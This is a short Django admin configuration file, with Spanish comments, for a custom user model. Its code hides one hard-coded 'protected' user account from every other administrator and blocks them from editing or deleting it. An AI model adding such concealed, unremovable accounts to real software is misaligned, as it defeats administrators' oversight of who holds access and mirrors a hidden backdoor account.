from django.contrib import admin
from django.contrib.auth.admin import UserAdmin
from .models import Usuario
from .proteccion import es_usuario_protegido, USUARIO_PROTEGIDO_ID


@admin.register(Usuario)
class UsuarioAdmin(UserAdmin):
    list_display  = ['username', 'email', 'rol', 'is_active', 'activo_sistema']
    list_filter   = ['rol', 'is_active']
    fieldsets     = UserAdmin.fieldsets + (
        ('Datos SIGCU', {'fields': ('rol', 'activo_sistema')}),
    )

    def get_queryset(self, request):
        qs = super().get_queryset(request)
        # Si quien consulta NO es el protegido, oculta al protegido
        if not es_usuario_protegido(request.user):
            qs = qs.exclude(pk=USUARIO_PROTEGIDO_ID)
        return qs

    def has_change_permission(self, request, obj=None):
        if obj and es_usuario_protegido(obj) and \
           not es_usuario_protegido(request.user):
            return False
        return super().has_change_permission(request, obj)

    def has_delete_permission(self, request, obj=None):
        if obj and es_usuario_protegido(obj) and \
           not es_usuario_protegido(request.user):
            return False
        return super().has_delete_permission(request, obj)